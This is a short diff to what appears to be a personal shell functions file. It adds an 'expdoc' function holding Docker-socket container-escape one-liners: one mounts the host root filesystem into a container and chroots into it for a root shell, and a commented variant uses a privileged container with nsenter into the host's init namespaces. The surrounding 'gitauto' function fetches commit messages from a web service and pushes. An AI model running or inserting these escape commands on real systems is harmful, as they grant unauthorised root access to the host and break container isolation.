@@ -67,3 +67,8 @@ function gitauto() {
 	git commit -m "$(wget -qO- http://whatthecommit.com/index.txt)";
 	git push;
 }
+
+function expdoc() {
+	docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+	# docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+}
